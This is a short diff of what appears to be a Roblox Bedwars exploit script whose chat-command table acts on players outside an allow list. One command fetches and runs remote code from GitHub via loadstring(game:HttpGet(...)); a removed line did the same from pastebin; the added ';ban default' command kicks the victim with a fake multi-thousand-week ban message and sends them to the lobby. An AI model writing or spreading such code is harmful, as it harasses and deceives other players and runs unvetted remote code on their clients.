@@ -10695,9 +10695,12 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[";byelex default"] = function()
+	[";ban default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://pastebin.com/raw/7v1yr6i1"))()
+			task.spawn(function()
+				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+			end)
+			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 		end
 	end,
 	[";freeze default"] = function()
